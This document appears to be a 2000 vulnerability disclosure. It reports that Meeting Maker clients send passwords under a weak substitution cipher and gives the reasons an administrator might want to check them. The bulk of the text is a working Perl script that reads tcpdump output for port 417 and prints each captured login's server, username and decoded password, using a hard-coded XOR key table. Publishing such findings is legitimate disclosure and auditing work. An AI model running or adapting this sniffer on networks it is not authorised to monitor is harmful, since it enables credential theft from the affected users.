Meeting Maker is a networked calendaring/scheduling software package
that's estimated to be installed on over 700,000 desktops (e.g., see
http://www.meetingmaker6.com/presslib/pressrel/mm061499mm6.htm).
(Meeting Maker is a registered trademark of ON Technology Corporation.)

Clients send passwords to a Meeting Maker server encoded using a
polyalphabetic substitution cipher. For an outline of the risks, as
well as suggestions about how to reduce vulnerability and notes about
future Meeting Maker security changes, go to the Tech Note index page
at http://support.on.com/support/mmxp.nsf/Public/Chronological and
select the security item dated 04/19/2000.

I was able to determine the password encoding by intercepting
client-to-server traffic. Meeting Maker site administrators may need
to check on what passwords are being sent because of requirements for

 -- Auditing. You may have a policy that a user must not choose a
    Meeting Maker password that's the same as any of their other
    passwords, and need to verify policy adherence.
 -- Network planning. You may need to assess whether password-stealing
    threats justify the costs of making the communication channel
    between your Meeting Maker clients and server encrypted (or
    otherwise less vulnerable to eavesdropping).

I've included a script that can be used in conjunction with tcpdump to
monitor one's network for Meeting Maker logins. For each login
exchange that the script detects, the script provides the IP address
of the Meeting Maker server, the server name (this won't necessarily
match the server's DNS hostname), and the client user's name and
password. The script does not understand the client-server protocol,
and may well miss some (or, potentially in some environments, all)
valid login exchanges. The network-traffic details that were used in
developing the script were based on client hosts running Meeting Maker
Java Client 6.04 and a Meeting Maker server running on Windows NT 4.0.

Matt Power
mhpower@mit.edu


#!/usr/bin/perl
#
# mmdump -- filters tcpdump output to find Meeting Maker passwords
#
# Author: Matt Power, mhpower@mit.edu
# 24 April 2000
#
#
# usage: tcpdump -lnx -s 300 'tcp dst port 417' | mmdump
#
# (Note: Meeting Maker is a registered trademark of ON Technology
# Corporation)
#
#
@x = (20, 8, 9, 19, 9, 19, 1, 19, 20, 21, 16, 9, 4, 23, 1, 19,
      20, 5, 15, 6, 20, 9, 13, 5, 1, 14, 4, 19, 16, 1, 3, 5);
$in = "";
$ipl = <>;
@ipf = split(/ /, $ipl);
@ic = split(/\./, $ipf[3]);
$ip = $ic[0] . "." . $ic[1] . "." . $ic[2] . "." . $ic[3];
while (<>)
{
    if (/^\s/)
    {
        $in .= $_;
    }
    else
    {
        $ipl = $_;
        @ipf = split(/ /, $ipl);
        @ic = split(/\./, $ipf[3]);
        $newip = $ic[0] . "." . $ic[1] . "." . $ic[2] . "." . $ic[3];
        $in =~ s/\s//g;
        $in =~ s/(..)/$1 /g;
        if ($in =~ /.*7f ff ff .*?00 00 00 .*?00 00 00 (.*)/)
        {
            if ($1 !~ /^[0 ]+$/)
            {
                ($s = $1) =~ s/ //g;
                $s1 = hex(substr($s, 0, 2));
                $s = substr($s, 2, length($s) - 2);
                $s0 = hex(substr($s, 0, 2));
                $s3 = 2 * ($s0 + 3);
                $s = substr($s, 2, length($s) - 2);
                if ($s1 == $s0 + 1 and length($s) >= $s3)
                {
                    $f = substr($s, 0, $s0 * 2);
                    $p = sprintf "H%d", 2 * $s0;
                    $fn = pack $p, $f;
                    $out = "Server Address: " . $ip . "\n";
                    $out .= "Server Name: " . $fn . "\n";
                    $s = substr($s, $s3, length($s) - $s3);
                    $s1 = hex(substr($s, 0, 2));
                    $s = substr($s, 2, length($s) - 2);
                    $s0 = hex(substr($s, 0, 2));
                    $s3 = 2 * ($s0 + 3);
                    $s = substr($s, 2, length($s) - 2);
                    if ($s1 == $s0 + 1 and length($s) >= $s3)
                    {
                        $f = substr($s, 0, $s0 * 2);
                        $p = sprintf "H%d", 2 * $s0;
                        $fn = pack $p, $f;
                        $out .= "User Name: " . $fn . "\nPassword: ";
                        $s = substr($s, $s3, length($s) - $s3);
                        $s1 = hex(substr($s, 0, 2));
                        $s = substr($s, 2, length($s) - 2);
                        $s0 = hex(substr($s, 0, 2));
                        $s = substr($s, 2, length($s) - 2);
                        if ($s1 == $s0 + 1 and length($s) == 2 * $s0)
                        {
                            for ($j = 0; $j < 2 * $s0; $j += 2)
                            {
                                $nr = hex(substr($s, $j, 2));
                                $i = $j / 2;
                                if ($nr >= 96)
                                {
                                    $nr -= 96;
                                    if ($i)
                                    {
                                        $out = "";
                                        last;
                                    }
                                    $out .= chr(($nr ^ $x[$i]) + 32);
                                }
                                elsif ($nr >= 64)
                                {
                                    $nr -= 64;
                                    if (! $i)
                                    {
                                        $out = "";
                                        last;
                                    }
                                    $out .= chr(($nr ^ $x[$i]) + 32);
                                }
                                elsif ($nr >= 32)
                                {
                                    $nr -= 32;
                                    $out .= chr(($nr ^ $x[$i]) +
                                                ($i ? 64 : 96));
                                }
                                else
                                {
                                    $out .= chr(($nr ^ $x[$i]) +
                                                ($i ? 96 : 64));
                                }
                            }
                            if ($out ne "")
                            {
                                print $out . "\n\n";
                            }
                        }
                    }
                }
            }
        }
        $in = "";
        $ip = $newip;
    }
}

